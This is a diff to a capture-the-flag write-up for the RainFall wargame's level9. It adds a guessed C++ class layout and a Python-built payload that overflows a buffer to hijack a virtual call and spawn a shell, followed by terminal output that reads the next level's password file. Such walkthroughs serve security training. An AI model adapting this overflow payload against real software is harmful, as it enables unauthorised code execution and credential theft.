@@ -40,3 +40,28 @@ level9@RainFall:~$ objdump -CD level9
 
 Here for instance, we can see that the function `_ZN1NC1Ei` is actually `N::N(int)`, which is the constructor of a class `N` that takes an integer as a parameter.
 
+Suspected class declaration used:
+
+class N {
+public:
+    
+    char    buffer[100];
+    int     value;
+
+    virtual int operator+(N& other);
+    virtual int operator-(N& other);
+};
+
+
+
+Winning payload:
+
+./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "||sh\x00" + "A"*100 + "\x0c\xa0\x04\x08" + "||sh\x00\x00\x00\x00")')
+
+level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "||sh\x00\x00\x00\x00")')
+sh: 1: 
+       : not found
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
